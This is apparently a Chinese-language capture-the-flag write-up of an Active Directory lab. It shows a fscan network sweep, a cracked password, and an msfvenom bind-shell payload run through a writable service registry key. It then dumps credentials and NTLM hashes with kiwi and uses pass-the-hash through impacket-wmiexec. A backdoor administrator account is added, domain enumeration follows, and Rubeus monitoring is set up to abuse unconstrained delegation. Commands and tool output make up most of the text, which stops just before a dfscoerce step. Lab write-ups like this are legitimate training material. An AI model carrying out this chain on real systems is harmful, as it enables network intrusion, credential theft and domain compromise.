<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24</span><br><span class="line">./fscan -h 172.22.4.36/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-18 11:04:32] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-18 11:04:32] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-18 11:04:32] [INFO] CIDR范围: 172.22.4.0-172.22.4.255</span><br><span class="line">[2025-04-18 11:04:32] [INFO] 生成IP范围: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-18 11:04:32] [INFO] 解析CIDR 172.22.4.36/24 -&gt; IP范围 172.22.4.0-172.22.4.255</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.7      存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.36     存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.45     存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.19     存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:39] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-18 11:04:39] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:80</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:80</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:135</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:139</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:135</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:139</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:135</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:139</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:389</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:445</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:22</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:21</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:445</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:445</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:88</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:3306</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 服务识别 172.22.4.36:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \&gt;; caching_sha2_password]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:80 =&gt; [http]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.19:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:445 =&gt; </span><br><span class="line">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.19:445 =&gt; </span><br><span class="line">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.45:445 =&gt; </span><br><span class="line">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.7:88 =&gt; </span><br><span class="line">[2025-04-18 11:04:48] [SUCCESS] 服务识别 172.22.4.36:80 =&gt; [http]</span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.7:135 =&gt; </span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.19:135 =&gt; </span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.45:135 =&gt; </span><br><span class="line">[2025-04-18 11:05:44] [INFO] 存活端口数量: 16</span><br><span class="line">[2025-04-18 11:05:44] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-18 11:05:44] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.4.45</span><br><span class="line">主机名: WIN19</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.4.45</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.45        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.4.7</span><br><span class="line">主机名: DC01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.4.7</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.4.19</span><br><span class="line">主机名: FILESERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.4.19</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[2025-04-18 11:05:45] [INFO] 系统信息 172.22.4.7 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.36        状态码:200 长度:68100  标题:中文网页标题</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的flag1给了个提示在WIN19那台机器上存在一个Adrian用户，密码在rockyou里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED</span><br></pre></td></tr></table></figure>

<p>还是得眼尖一点，密码过期他不会告诉你，rdp登录修改密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation2.png"></p>
<p>桌面上有一个PrivescCheck文件夹，PrivescCheck是一个提权的工具，他跑完了留下一个html文件，直接访问就行</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation3.png"></p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation4.png"></p>
<p>给了两个high，第一个WSUS 更多的是被利用来横向移动,第二个注册表，用户对gpupdate具有写、启动、停止的的权限</p>
<p>用msf生成一个正向的木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set LPORT 9999</span><br><span class="line">set RHOST 172.22.4.45</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>将马上传上去然后修改一下注册表手动启动服务</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure>

<p>但是这个shell很快就会断开，所以要迁移到另一个进程中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate PID</span><br></pre></td></tr></table></figure>

<p>不知道为什么我的msf shell启动不起来，导出hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain    NTLM                              SHA1</span><br><span class="line">--------  ------    ----                              ----</span><br><span class="line">Adrian    WIN19     4ba5d16eb261eb61148ab5264f457cbb  9a712bd84b09123d36da74d9d5ac255c027588eb</span><br><span class="line">WIN19$    XIAORANG  d41fef724adf6f2ed2cbb5a4ebd186c9  af156e5c6afc93b1a648040bd59f7d5cab23d81a</span><br><span class="line">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain    Password</span><br><span class="line">--------  ------    --------</span><br><span class="line">(null)    (null)    (null)</span><br><span class="line">Adrian    WIN19     (null)</span><br><span class="line">WIN19$    XIAORANG  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain        Password</span><br><span class="line">--------  ------        --------</span><br><span class="line">(null)    (null)        (null)</span><br><span class="line">Adrian    WIN19         (null)</span><br><span class="line">WIN19$    xiaorang.lab  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25</span><br><span class="line">                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4</span><br><span class="line">                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16</span><br><span class="line">                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a</span><br><span class="line">                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6</span><br><span class="line">                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d</span><br><span class="line">                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d</span><br><span class="line">                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5</span><br><span class="line">                        c 57 a8</span><br><span class="line">WIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d</span><br><span class="line">                         90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5</span><br><span class="line">                        9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90</span><br><span class="line">                        0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e</span><br><span class="line">                         d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5</span><br><span class="line">                        3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f</span><br><span class="line">                        8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e</span><br><span class="line">                         a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e</span><br><span class="line">                        1 d0 1f</span><br><span class="line">win19$    XIAORANG.LAB  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25</span><br><span class="line">                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4</span><br><span class="line">                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16</span><br><span class="line">                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a</span><br><span class="line">                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6</span><br><span class="line">                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d</span><br><span class="line">                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d</span><br><span class="line">                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5</span><br><span class="line">                        c 57 a8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hashdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br></pre></td></tr></table></figure>

<p>用Administrator登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45</span><br><span class="line">C:\&gt;type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>

<h1 id="FLAG3-amp-FLAG4"><a href="#FLAG3-amp-FLAG4" class="headerlink" title="FLAG3&amp;FLAG4"></a>FLAG3&amp;FLAG4</h1><p>添加一个新用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user lv Asd123132 /add</span><br><span class="line">net localgroup administrators lv /add</span><br></pre></td></tr></table></figure>

<p>查看域内委派关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lv\Desktop&gt;Adinfo_win.exe -d=&quot;xiaorang.lab&quot; --dc=&quot;172.22.4.7&quot; -u=&quot;WIN19$&quot; -H=&quot;d41fef724adf6f2ed2cbb5a4ebd186c9&quot;</span><br><span class="line"></span><br><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.4.7&#x27;</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: WIN19$</span><br><span class="line">[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2016 Server operating system</span><br><span class="line">[i] Domain SID:</span><br><span class="line">                    [+] S-1-5-21-1913786442-1328635469-1954894845</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 10</span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 42(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] DC01$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.4.7</span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 0 found</span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 39 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 6 found</span><br><span class="line">[i] User with Mail: 0 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 3 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 3 found</span><br><span class="line">[i] Users with passwords not set to expire: 2 found</span><br><span class="line">[i] Domain Computers: 5 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 5 found</span><br><span class="line">[i] Groups: 49 found</span><br><span class="line">[i] Domain OUs: 1 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 2 found</span><br><span class="line">                    [+] WIN-3X7U15C2XDM$  ==&gt;&gt;&gt;  Marcus</span><br><span class="line">                    [+] WIN-YUUAW2QG9MF$  ==&gt;&gt;&gt;  Marcus</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 1 found</span><br><span class="line">                    [+] WIN19$</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in C:\Users\lv\Desktop</span><br><span class="line">[i] Execution took 1.0246743s</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[i] Unconstrained Deligation Users: 1 found</span><br><span class="line">                    [+] WIN19$</span><br></pre></td></tr></table></figure>

<p>WIN19$有非约束委派，上传Rubeus进行监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lv\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : DC01$</span><br><span class="line">[*] Monitoring every 1 seconds for new TGTs</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后使用dfscoerce让DS向WIN19$认证</p>
